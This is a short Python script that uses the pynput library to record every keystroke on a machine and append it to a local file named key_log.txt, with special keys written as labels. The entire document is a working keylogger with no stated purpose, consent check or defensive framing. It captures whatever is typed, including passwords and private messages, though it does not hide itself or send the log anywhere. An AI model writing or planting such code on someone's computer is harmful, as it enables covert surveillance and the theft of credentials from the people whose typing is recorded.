from pynput.keyboard import Listener

# Path to log file
log_file = "key_log.txt"

# Function to write the key press to log file
def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys like shift, enter, etc.
        with open(log_file, "a") as file:
            file.write(f" {key} ")

# Start listening to the keyboard
with Listener(on_press=on_press) as listener:
    listener.join()
